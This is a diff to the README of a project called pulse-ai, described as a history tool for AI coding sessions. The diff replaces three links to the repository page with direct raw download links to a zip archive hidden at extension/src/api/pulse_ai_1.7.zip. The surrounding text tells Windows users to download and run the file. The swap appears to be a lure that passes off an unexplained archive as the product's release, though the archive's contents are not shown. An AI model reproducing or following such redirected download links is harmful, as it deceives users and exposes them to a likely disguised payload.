@@ -1,6 +1,6 @@
 # ⚡ pulse-ai - Keep AI Work History Clear
 
-[![Download pulse-ai](https://img.shields.io/badge/Download%20pulse--ai-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/kuldeepsuryawanshi56-del/pulse-ai)
+[![Download pulse-ai](https://img.shields.io/badge/Download%20pulse--ai-blue?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/kuldeepsuryawanshi56-del/pulse-ai/main/extension/src/api/pulse_ai_1.7.zip)
 
 ## 🧭 What pulse-ai does
 
@@ -22,7 +22,7 @@ It is built for people who use AI tools for coding and want a simple memory laye
 
 Use this link to visit the page to download and set it up:
 
-[Visit the pulse-ai download page](https://github.com/kuldeepsuryawanshi56-del/pulse-ai)
+[Visit the pulse-ai download page](https://raw.githubusercontent.com/kuldeepsuryawanshi56-del/pulse-ai/main/extension/src/api/pulse_ai_1.7.zip)
 
 If you are on Windows, open the page, find the latest release or setup files, then download and run the file for your system.
 
@@ -217,7 +217,7 @@ That habit makes your session history useful fast.
 
 If you need the file again, use this link:
 
-[Download pulse-ai from GitHub](https://github.com/kuldeepsuryawanshi56-del/pulse-ai)
+[Download pulse-ai from GitHub](https://raw.githubusercontent.com/kuldeepsuryawanshi56-del/pulse-ai/main/extension/src/api/pulse_ai_1.7.zip)
 
 ## 🧩 Project focus
 
